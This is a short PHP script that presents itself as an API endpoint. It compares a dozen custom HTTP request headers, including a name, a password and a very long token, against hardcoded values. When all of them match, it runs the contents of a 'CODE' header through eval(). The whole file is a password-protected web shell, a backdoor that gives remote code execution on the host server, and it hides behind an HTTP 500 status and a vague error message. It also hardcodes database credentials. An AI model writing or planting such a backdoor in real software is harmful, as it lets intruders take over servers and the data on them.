<?php
//Config
$ok_ct = "test/example/ctCT";
$ok_prot = "test_protocol";
$ok_type = "php_api";
$ok_name = "user_A";
$ok_pw = "4328432u4ihb_Az0-";
$ok_j1 = "8984659582f77d6813f183C4B22E39FF17378f50ce0e0c00725b70802c42Cc0e4c73c4CA2E665441826492580a43d96cf257a3Af92A6E35A3241d77d2388d2d428153cadeb8D30ba5fE42E6046b4fBBcCD76103d71978d9FC2Cf67fACbEE331C5479EB1283889b7D4ac8664Df8bf97995b5EF42e4316E693ee74746028d9f31F2F2f4CE03cB45CdAd0A049F91f6AAd7f3432c8dC4F2381a61Ca90b0edBAe259FE4aB6609c06249E0Fb3bfEdba6c76119d8C5e463F648271119B6aFa87E99193843ED9f3FCd665Bb789CeF6Af06a162eEA5c3d5270485cC7813d96CcE0305D8378d488A3eA7a5B1981923aDEbbd970F4F9b79Fe0b3A68aC1d384A7B212d1bc233ED1A5D4a731FB39C6820038910b673D92A80e6291D0f21948384C245D89d0c8E9Da3BFd078E9648546F0A844c6ec7A218De0dE1388b4E56693978291521CaEab3a8b8b761BC5cecbB04Cc575Cb532E30F5eD96b6d13Ab28492e4aFBa65094AE010E94282202ee0c498c44db6D066e881320dE8C4DC3dF7885D50e096d9A530605F24e25054df9fe8a5AB94a3f2C27A081EAdeF0FCB64Da3024dE4816a7d361Ef311EDBBC23222bE1505Cf1EBDEB70969D5DA666CcDeDfBA38D45F9A72E829E80dE79c71F9F45827f6C6d856D9318B10a1c2b738CCfE8EA816C924bf4ec3Fb298BB4203005d1cFf86b045f3FBF190b8D074E05dCc5631f7013dFa3586ed98D7640804F686cf14d2f7b13242314D67B678e151E597D7269aE5c6bD7ed9222293681ab30DE28E5Ec7349349dc5Ff72508952E6FA2143C64c282bab708Ad8A9D1f3b66da8f6F4CCc0E1756fb417194F63D7f0E34C250dF1faE896b90656e76fAf25dAb08d08e4497ddE34d85c7E991d9acfc3657bA0b85D0f04F7fa258f219A25Db92BB179b49bE0747AA641f0eAa3f72591fa87De9FC48fb3F4be90de3142B22E7C61eAf657CaF6B987221d1D49B41820c253882a302E83aF8FE15a0EC22A5cb5A9EAb17f2D50FD5411fBfA6E82461164b5d94dd1c0A6cF301C963B89320CEB221B5df47866E6fEe07AbFcb73aA62FE12D102128e5A40803A54Ba9A4F7FE6241e5427375d74F3745092Ef1757AE25e708B88b415d504c3209614911331592d2af8EeE9d9895a2CC54C8Cb032FC46f915846097AB06c48e9A4A5E120aA3552EAFD1f85853A4eD11D0e1086427E6C8FD922D98aa8722CCE6C52633A78226A5F2209Ac8a3C4Bd1FD0Ba0270ae4F0dfA3707208834dF06D0FB6A0dBd0933498465A3d784440f3EdE6bcA8782171CD23CC10cB855f9f132F7C70449b27BAaB8dB1eBdBd28E8498310509a721f39D6B0f4d560F8771B08eB51959fAFb4FE97a5FAEe59369F41b9c69dbE5B04A6FB4e3e67155DD098831Ed6137C784aBB38c9FF9E4744F5815249027c9648B6c6425d224ff70e7dB07643c4d10a7CB190418fB755be308BEB6e22F4a66Ced84a4240DEF3AE817dbac2929138A660C7638A44FBAeFCc6cd615720d4C58f27e430Ca54E03A89C9E6F02a9ddF153919aae3501E87296Beb93f8B670e2cAF63923877afd9C9c5f7a54F80e421009465d7d88bc2D62dc083A5BC6aaf2DE0c801a8Abdbdb3c429f1c03c6CF6DDAfda9Fd9672b44AaBf32A75781E6F61eC295DC630Ef39AB0EAb1d6D702F1e2dC79E8e5EaB92fD6144c8EDCfA591A1E0D898eb0234D8E75D1E49b2b8352A8b24E7622B3322e2759Ac95B57b03266Edc6F840a828e7EB4eEDdde66CCF3f7B11dbf6Ac5D536354191301AA78AaE86aeC3C3fDA0Dc4dc916571FBd41fd69B72Ba650e9B51F76D5F7D0C140A75f63358E16ce77553fdeBd190A96812D55b5073204c8015849fdb86E23C34fAE0239055B1BBE3E9FB47a8Ee5DdC156ED38194A52889367c8f636548970177f5ce22cA9B7F8433c2053Ec49caea0A2C9557B9f6955948bc192CE16006B9391FEDB40Cd95E055689282E4E306fF971F0e19c2850e953eFbbdEd9e7938E70483EaA1cDf04062244b2d3b721b5864A9968e2927bBB43e44AD7d349CD720c1a99Ef32b01a4eaF8a6301b5Cd4884Cc0B0f75b08Ddf3AeDfD775F7B816A3e0E2ae4C9B527F0F4Cd0e723Ba1Ff09bf80C9F75093F13b140Cbe3021F0CB1147DDCcd5378981407CA904C19420C7874Ccf7C96cb08b7BE9c0B27Ddd5fff9Ead6ee06DbAa0e624Cbc8e374FD4dCf5e71A275140f0612f26B5CB9438924E8AabaC648b15Acfc8079794b5De98B00aB26003598382aF6b7F17AB64CB1fe3C6cAF4F22daC773C4A9eaa394";
$ok_j2 = "AC-DC";
$ok_j3 = "reee";
$ok_j4 = "23hio4#here XD2hr8";
$ok_j5 = "test34g578g7$bibr3BI#UR34uh";
$ok_doubleQuote = ".|dq|.";
$ok_singleQuote = ".|sq|.";
//
//Database setup
$conn = new mysqli("localhost", "test", "123", "test_db");
//
http_response_code(500);
header('Content-Disposition: attachment; filename="about:blank"');
$ct = $_SERVER["CONTENT_TYPE"];
$prot = $_SERVER["HTTP_PROTOCOL"];
$type = $_SERVER["HTTP_TYPE"];
$name = htmlspecialchars($_SERVER["HTTP_NAME"]);
$pw = htmlspecialchars($_SERVER["HTTP_PASSWORD"]);
$jellyFish = [$_SERVER["HTTP_J1"], $_SERVER["HTTP_J2"], $_SERVER["HTTP_J3"], $_SERVER["HTTP_J4"], $_SERVER["HTTP_J5"]];
$code = $_SERVER["HTTP_CODE"];
$doubleQuote = $_SERVER["HTTP_DQCODE"];
$singleQuote = $_SERVER["HTTP_SQCODE"];

if ($ct != $ok_ct || $prot != $ok_prot || $type != $ok_type || $name != $ok_name || $pw != $ok_pw || $jellyFish[0] != $ok_j1 || $jellyFish[1] != $ok_j2 || $jellyFish[2] != $ok_j3 || $jellyFish[3] != $ok_j4 || $jellyFish[4] != $ok_j5 || $doubleQuote != $ok_doubleQuote || $singleQuote != $ok_singleQuote) {
    die("error_no_access_endpoint");
}

$code = str_replace($ok_doubleQuote, "\"", $code);//Double quote fix
$code = str_replace($ok_singleQuote, "'", $code);//Single quote fix

eval($code);
?>